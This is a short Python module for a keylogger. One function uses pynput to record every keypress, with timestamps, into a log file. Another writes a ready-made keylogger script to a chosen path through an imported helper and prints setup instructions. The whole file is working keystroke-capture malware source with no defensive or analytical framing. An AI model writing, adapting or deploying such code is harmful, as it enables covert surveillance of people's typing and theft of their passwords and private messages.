from pynput.keyboard import Key, Listener
import logging
from .utilities.keylogger_utils import *

class keylogger:
    def start(logfile_path, allow_print):
        logging.basicConfig(filename=logfile_path, level=logging.DEBUG, format=" %(asctime)s - %(message)s")

        def on_press(key):
            logging.info(str(key))
            if allow_print == True:
                print(str(key))
            else:
                pass

        with Listener(on_press=on_press) as listener:
            listener.join()

    def make_keylogger(file_path):
        file = open(file_path, "w")
        content(file)
        file.close()
        print()
        print("Done !")
        print("Note : Don't forget to change the file path at line 4")
        print()
